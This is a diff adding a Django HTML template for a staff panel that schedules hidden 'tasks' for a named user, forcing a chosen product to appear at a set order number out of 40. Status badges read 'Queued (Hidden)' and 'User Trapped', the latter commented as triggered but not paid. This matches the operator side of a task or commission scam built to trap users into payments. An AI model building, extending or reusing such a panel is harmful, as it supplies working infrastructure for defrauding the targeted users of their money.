@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Schedule Task - {{ target_user.username }}</title>
+    <style>
+        body { margin: 0; background: #f5f7fa; font-family: 'Segoe UI', sans-serif; color: #2c3e50; }
+        .container { max-width: 900px; margin: 40px auto; padding: 20px; }
+        
+        /* Top Navigation */
+        .top-nav { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
+        .btn-back { background: #34495e; color: white; padding: 10px 18px; border-radius: 6px; text-decoration: none; font-weight: bold; font-size: 14px; }
+        
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); margin-bottom: 30px; }
+        .config-bar { background: #ebf5ff; padding: 20px; border-radius: 8px; margin-bottom: 25px; display: flex; align-items: center; gap: 15px; border: 1px solid #3498db; }
+        
+        table { width: 100%; border-collapse: collapse; }
+        th { text-align: left; padding: 12px; color: #94a3b8; font-size: 11px; text-transform: uppercase; border-bottom: 2px solid #eee; }
+        td { padding: 15px 12px; border-bottom: 1px solid #f9f9f9; }
+        
+        /* Status Badges */
+        .status-badge { padding: 4px 10px; border-radius: 20px; font-size: 11px; font-weight: bold; text-transform: uppercase; color: #fff; }
+        .bg-waiting { background: #94a3b8; } /* Gray for hidden/waiting */
+        .bg-completed { background: #2ecc71; } /* Green */
+        .bg-pending { background: #f39c12; } /* Orange for triggered but not paid */
+        
+        .badge-trigger { background: #0f172a; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
+
+        .btn-assign { background: #3498db; color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: bold; transition: 0.2s; }
+        .btn-assign:hover { background: #2980b9; }
+        .btn-danger { background: #e74c3c; color: white; border: none; padding: 6px 12px; border-radius: 4px; cursor: pointer; }
+        .btn-edit { background: #f39c12; color: white; border: none; padding: 6px 12px; border-radius: 4px; text-decoration: none; font-size: 13px; }
+        .input-num { padding: 10px; border: 2px solid #3498db; border-radius: 6px; width: 100px; font-weight: bold; font-size: 16px; outline: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        {% if messages %}
+            {% for message in messages %}
+                <div style="padding: 15px; background: #d4edda; color: #155724; border-radius: 8px; margin-bottom: 20px; border: 1px solid #c3e6cb;">
+                    {{ message }}
+                </div>
+            {% endfor %}
+        {% endif %}
+
+        <div class="top-nav">
+            <h2 style="margin:0;">Task Management: <span style="color: #3498db;">{{ target_user.username }}</span></h2>
+            <a href="{% url 'staffs' %}" class="btn-back">← Back to Dashboard</a>
+        </div>
+
+        <div class="card">
+            <h3 style="color: #2c3e50; margin-bottom: 20px; border-left: 5px solid #2c3e50; padding-left: 15px;">Scheduled Tasks Record</h3>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Trigger At</th>
+                        <th>Product Name</th>
+                        <th>Price</th>
+                        <th>Status</th>
+                        <th>Actions</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for order in scheduled_orders %}
+                    <tr>
+                        <td><span class="badge-trigger">Order #{{ order.scheduled_at }}</span></td>
+                        <td>{{ order.product_name }}</td>
+                        <td><strong>${{ order.price }}</strong></td>
+                        <td>
+                            {% if order.status == 'completed' %}
+                                <span class="status-badge bg-completed">Completed</span>
+                            {% elif order.status == 'pending' %}
+                                <span class="status-badge bg-pending">User Trapped</span>
+                            {% else %}
+                                <span class="status-badge bg-waiting">Queued (Hidden)</span>
+                            {% endif %}
+                        </td>
+                        <td>
+                            {% if order.status == 'scheduled' %}
+                                <a href="{% url 'edit_order_staff' order.id %}" class="btn-edit">Edit</a>
+                            {% endif %}
+                            
+                            <form method="POST" style="display:inline;">
+                                {% csrf_token %}
+                                <input type="hidden" name="order_id" value="{{ order.id }}">
+                                <button type="submit" name="delete_scheduled" class="btn-danger" onclick="return confirm('Permanently delete this record?')">Delete</button>
+                            </form>
+                        </td>
+                    </tr>
+                    {% empty %}
+                    <tr>
+                        <td colspan="5" style="text-align:center; padding: 40px; color: #94a3b8;">
+                            <i>No special tasks currently assigned to this user.</i>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+
+        <div class="card">
+            <h3 style="color: #3498db; margin-bottom: 10px; border-left: 5px solid #3498db; padding-left: 15px;">Assign New Task</h3>
+            <p style="margin-bottom: 25px; color: #7f8c8d;">User's Current Progress: <strong>{{ target_user.profile.current_progress }} / 40</strong></p>
+
+            <div class="config-bar">
+                <div>
+                    <label style="display:block; font-size: 11px; font-weight: bold; color: #2980b9; margin-bottom: 5px;">TRIGGER AT ORDER #:</label>
+                    <input type="number" id="global_target" class="input-num" value="{{ target_user.profile.current_progress|add:1 }}" min="1">
+                </div>
+                <div style="flex: 1;">
+                    <p style="font-size: 13px; color: #34495e; margin: 0; line-height: 1.4;">
+                        Select a template below. When the user reaches the order number specified on the left, 
+                        the system will <b>force</b> this task to appear instead of a random one.
+                    </p>
+                </div>
+            </div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Product Template</th>
+                        <th>Price</th>
+                        <th>Commission</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for t in templates %}
+                    <tr>
+                        <td><strong>{{ t.product_name }}</strong></td>
+                        <td>${{ t.price }}</td>
+                        <td>{{ t.commission_rate }}%</td>
+                        <td>
+                            <form method="POST" onsubmit="syncNumber(this)">
+                                {% csrf_token %}
+                                <input type="hidden" name="template_id" value="{{ t.id }}">
+                                <input type="hidden" name="target_num" class="hidden-target">
+                                <button type="submit" class="btn-assign">Schedule This</button>
+                            </form>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <script>
+        // This ensures the value in the "Trigger At" box is sent with the form
+        function syncNumber(form) {
+            const num = document.getElementById('global_target').value;
+            form.querySelector('.hidden-target').value = num;
+        }
+
+        // Auto-increment the trigger number slightly when a staff member looks at it
+        // (Optional: change +1 to +5 if you want it further out)
+    </script>
+</body>
+</html>
